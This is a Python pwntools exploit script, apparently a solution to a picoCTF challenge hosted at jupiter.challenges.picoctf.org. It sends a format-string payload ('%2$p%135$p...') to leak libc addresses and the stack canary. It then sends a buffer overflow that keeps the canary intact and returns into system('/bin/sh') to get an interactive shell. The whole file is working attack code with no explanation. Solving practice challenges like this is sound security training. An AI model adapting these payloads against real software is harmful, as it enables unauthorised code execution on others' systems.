from pwn import *
import time

#r = process("./vuln", env={'LD_PRELOAD' : 'libc6.so'})
"""
gdb.attach(r,'''
b *0x0804871a
b *0x080487ce
''')
"""
r = remote("jupiter.challenges.picoctf.org" , 26732)
libc = ELF("libc6.so")
win = 0x0804876e
seed = "-31"
print r.sendlineafter("What number would you like to guess?\n",seed)
s = r.recvline()
print(s)
log.info("Found it! : "+seed)
#sleep(1)
payload = "%2$p%135$p%64$p%111$p"
r.sendlineafter("Name? ", payload)
r.recvuntil("Congrats: ")
leak = int(r.recv(10),16)
canary = int(r.recv(10),16)
leak2 = int(r.recv(10),16)
leak3 = int(r.recv(10),16)-34
log.info("Leak : "+hex(leak))
log.info("Canary : "+hex(canary))
log.info("Leak2 : "+hex(leak2))
log.info("Leak3 : "+hex(leak3))
libc.address = leak - 0x1d55c0
log.info("Libc base : "+hex(libc.address))
print r.sendlineafter("What number would you like to guess?\n",seed)
s = r.recvline()
print(s)
binsh = next(libc.search("/bin/sh"))
system = libc.sym["system"]
log.info("System : "+hex(system))
payload = "a"*512
payload += p32(canary)
payload += "a"*12
payload += p32(system)
payload += "aaaa"
payload += p32(binsh)
r.sendlineafter("Name? ", payload)
r.interactive()
